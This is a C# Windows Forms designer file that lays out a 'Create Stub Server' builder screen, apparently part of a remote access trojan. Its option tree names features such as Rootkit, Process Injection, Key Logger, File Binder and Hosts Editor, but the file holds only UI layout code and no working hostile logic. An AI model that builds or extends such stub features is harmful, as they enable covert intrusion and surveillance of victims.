namespace PpRClientInterface.Forms
{
    partial class CreateStub
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(CreateStub));
            System.Windows.Forms.TreeNode treeNode1 = new System.Windows.Forms.TreeNode("General");
            System.Windows.Forms.TreeNode treeNode2 = new System.Windows.Forms.TreeNode("Connections");
            System.Windows.Forms.TreeNode treeNode3 = new System.Windows.Forms.TreeNode("Permissions");
            System.Windows.Forms.TreeNode treeNode4 = new System.Windows.Forms.TreeNode("Installation");
            System.Windows.Forms.TreeNode treeNode5 = new System.Windows.Forms.TreeNode("Safe Mode");
            System.Windows.Forms.TreeNode treeNode6 = new System.Windows.Forms.TreeNode("Display Message Box");
            System.Windows.Forms.TreeNode treeNode7 = new System.Windows.Forms.TreeNode("Rootkit");
            System.Windows.Forms.TreeNode treeNode8 = new System.Windows.Forms.TreeNode("Redistribution");
            System.Windows.Forms.TreeNode treeNode9 = new System.Windows.Forms.TreeNode("Process Injection");
            System.Windows.Forms.TreeNode treeNode10 = new System.Windows.Forms.TreeNode("Black List");
            System.Windows.Forms.TreeNode treeNode11 = new System.Windows.Forms.TreeNode("Hosts Editor");
            System.Windows.Forms.TreeNode treeNode12 = new System.Windows.Forms.TreeNode("Key Logger");
            System.Windows.Forms.TreeNode treeNode13 = new System.Windows.Forms.TreeNode("Add Plugins");
            System.Windows.Forms.TreeNode treeNode14 = new System.Windows.Forms.TreeNode("File Binder");
            System.Windows.Forms.TreeNode treeNode15 = new System.Windows.Forms.TreeNode("Choose Icon");
            System.Windows.Forms.TreeNode treeNode16 = new System.Windows.Forms.TreeNode("Assembly Binding");
            System.Windows.Forms.TreeNode treeNode17 = new System.Windows.Forms.TreeNode("Overview");
            System.Windows.Forms.TreeNode treeNode18 = new System.Windows.Forms.TreeNode("Build Finalization");
            System.Windows.Forms.TreeNode treeNode19 = new System.Windows.Forms.TreeNode("Profile Manager");
            this.button1 = new System.Windows.Forms.Button();
            this.imageList = new System.Windows.Forms.ImageList(this.components);
            this.progressBar1 = new System.Windows.Forms.ProgressBar();
            this.OptionsTreeView = new System.Windows.Forms.TreeView();
            this.statusBar1 = new System.Windows.Forms.StatusBar();
            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.panel1 = new CSharpCustomPanelControl.RoundCornerPanel();
            this.SuspendLayout();
            // 
            // button1
            // 
            this.button1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.button1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.button1.Location = new System.Drawing.Point(510, 336);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(115, 23);
            this.button1.TabIndex = 3;
            this.button1.Text = "Build Stub Server";
            this.button1.UseVisualStyleBackColor = true;
            // 
            // imageList
            // 
            this.imageList.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList.ImageStream")));
            this.imageList.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList.Images.SetKeyName(0, "Information.ico");
            this.imageList.Images.SetKeyName(1, "Execute.ico");
            this.imageList.Images.SetKeyName(2, "Message.ico");
            this.imageList.Images.SetKeyName(3, "Plugin Add.ico");
            this.imageList.Images.SetKeyName(4, "Processes.ico");
            this.imageList.Images.SetKeyName(5, "User.ico");
            this.imageList.Images.SetKeyName(6, "Setup.ico");
            this.imageList.Images.SetKeyName(7, "Keyboard.ico");
            this.imageList.Images.SetKeyName(8, "radioactivity.png");
            this.imageList.Images.SetKeyName(9, "shield.png");
            this.imageList.Images.SetKeyName(10, "dialog.png");
            this.imageList.Images.SetKeyName(11, "distribution.png");
            this.imageList.Images.SetKeyName(12, "connections.png");
            this.imageList.Images.SetKeyName(13, "application.png");
            this.imageList.Images.SetKeyName(14, "check_box_list.png");
            // 
            // progressBar1
            // 
            this.progressBar1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.progressBar1.Location = new System.Drawing.Point(197, 338);
            this.progressBar1.Name = "progressBar1";
            this.progressBar1.Size = new System.Drawing.Size(307, 20);
            this.progressBar1.TabIndex = 2;
            // 
            // OptionsTreeView
            // 
            this.OptionsTreeView.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.OptionsTreeView.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.OptionsTreeView.FullRowSelect = true;
            this.OptionsTreeView.HideSelection = false;
            this.OptionsTreeView.ImageIndex = 0;
            this.OptionsTreeView.ImageList = this.imageList;
            this.OptionsTreeView.Location = new System.Drawing.Point(6, 6);
            this.OptionsTreeView.Name = "OptionsTreeView";
            treeNode1.Name = "GeneralNode";
            treeNode1.Text = "General";
            treeNode2.ImageKey = "connections.png";
            treeNode2.Name = "ConnectionsNode";
            treeNode2.SelectedImageKey = "connections.png";
            treeNode2.Text = "Connections";
            treeNode3.ImageKey = "check_box_list.png";
            treeNode3.Name = "PermissionsNode";
            treeNode3.SelectedImageKey = "check_box_list.png";
            treeNode3.Text = "Permissions";
            treeNode4.ImageKey = "Setup.ico";
            treeNode4.Name = "InstallationNode";
            treeNode4.SelectedImageKey = "Setup.ico";
            treeNode4.Text = "Installation";
            treeNode5.ImageKey = "shield.png";
            treeNode5.Name = "SafeModeNode";
            treeNode5.SelectedImageKey = "shield.png";
            treeNode5.Text = "Safe Mode";
            treeNode6.ImageKey = "dialog.png";
            treeNode6.Name = "DisplayMsgBoxNode";
            treeNode6.SelectedImageKey = "dialog.png";
            treeNode6.Text = "Display Message Box";
            treeNode7.ImageKey = "radioactivity.png";
            treeNode7.Name = "RootkitNode";
            treeNode7.SelectedImageKey = "radioactivity.png";
            treeNode7.Text = "Rootkit";
            treeNode8.ImageKey = "distribution.png";
            treeNode8.Name = "RedistributionNode";
            treeNode8.SelectedImageKey = "distribution.png";
            treeNode8.Text = "Redistribution";
            treeNode9.ImageKey = "Processes.ico";
            treeNode9.Name = "ProcessInjectionNode";
            treeNode9.SelectedImageKey = "Processes.ico";
            treeNode9.Text = "Process Injection";
            treeNode10.Name = "BlackListNode";
            treeNode10.Text = "Black List";
            treeNode11.Name = "HostsEditorNode";
            treeNode11.Text = "Hosts Editor";
            treeNode12.ImageKey = "Keyboard.ico";
            treeNode12.Name = "KeyLoggerNodeNode";
            treeNode12.SelectedImageKey = "Keyboard.ico";
            treeNode12.Text = "Key Logger";
            treeNode13.ImageKey = "Plugin Add.ico";
            treeNode13.Name = "AddPluginsNode";
            treeNode13.SelectedImageKey = "Plugin Add.ico";
            treeNode13.Text = "Add Plugins";
            treeNode14.ImageKey = "Execute.ico";
            treeNode14.Name = "FileBinderNode";
            treeNode14.SelectedImageKey = "Execute.ico";
            treeNode14.Text = "File Binder";
            treeNode15.ImageKey = "Application.ico";
            treeNode15.Name = "ChooseIconNode";
            treeNode15.SelectedImageKey = "Application.ico";
            treeNode15.Text = "Choose Icon";
            treeNode16.ImageKey = "application.png";
            treeNode16.Name = "AssemblyBindingNode";
            treeNode16.SelectedImageKey = "application.png";
            treeNode16.Text = "Assembly Binding";
            treeNode17.ImageKey = "Information.ico";
            treeNode17.Name = "OverviewNode";
            treeNode17.SelectedImageKey = "Information.ico";
            treeNode17.Text = "Overview";
            treeNode18.Name = "BuildFinalizationNode";
            treeNode18.Text = "Build Finalization";
            treeNode19.ImageKey = "User.ico";
            treeNode19.Name = "ProfileManagerNode";
            treeNode19.SelectedImageKey = "User.ico";
            treeNode19.Text = "Profile Manager";
            this.OptionsTreeView.Nodes.AddRange(new System.Windows.Forms.TreeNode[] {
            treeNode1,
            treeNode2,
            treeNode3,
            treeNode4,
            treeNode5,
            treeNode6,
            treeNode7,
            treeNode8,
            treeNode9,
            treeNode10,
            treeNode11,
            treeNode12,
            treeNode13,
            treeNode14,
            treeNode15,
            treeNode16,
            treeNode17,
            treeNode18,
            treeNode19});
            this.OptionsTreeView.SelectedImageIndex = 0;
            this.OptionsTreeView.Size = new System.Drawing.Size(185, 352);
            this.OptionsTreeView.TabIndex = 0;
            this.OptionsTreeView.AfterSelect += new System.Windows.Forms.TreeViewEventHandler(this.OptionsTreeView_AfterSelect);
            // 
            // statusBar1
            // 
            this.statusBar1.Location = new System.Drawing.Point(0, 365);
            this.statusBar1.Name = "statusBar1";
            this.statusBar1.Size = new System.Drawing.Size(630, 22);
            this.statusBar1.SizingGrip = false;
            this.statusBar1.TabIndex = 4;
            // 
            // toolTip1
            // 
            this.toolTip1.AutoPopDelay = 5000;
            this.toolTip1.InitialDelay = 500;
            this.toolTip1.ReshowDelay = 50;
            this.toolTip1.ShowAlways = true;
            // 
            // panel1
            // 
            this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel1.BackColor = System.Drawing.SystemColors.Control;
            this.panel1.BorderColor = System.Drawing.Color.Gray;
            this.panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel1.Curvature = 1;
            this.panel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F);
            this.panel1.Location = new System.Drawing.Point(197, 6);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(428, 326);
            this.panel1.TabIndex = 96;
            // 
            // CreateStub
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(630, 387);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.progressBar1);
            this.Controls.Add(this.OptionsTreeView);
            this.Controls.Add(this.statusBar1);
            this.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "CreateStub";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
            this.Text = "Create Stub Server";
            this.Load += new System.EventHandler(this.CreateStubs_Load);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.ImageList imageList;
        private System.Windows.Forms.ProgressBar progressBar1;
        private System.Windows.Forms.TreeView OptionsTreeView;
        private System.Windows.Forms.StatusBar statusBar1;
        private System.Windows.Forms.ToolTip toolTip1;
        private CSharpCustomPanelControl.RoundCornerPanel panel1;

    }
}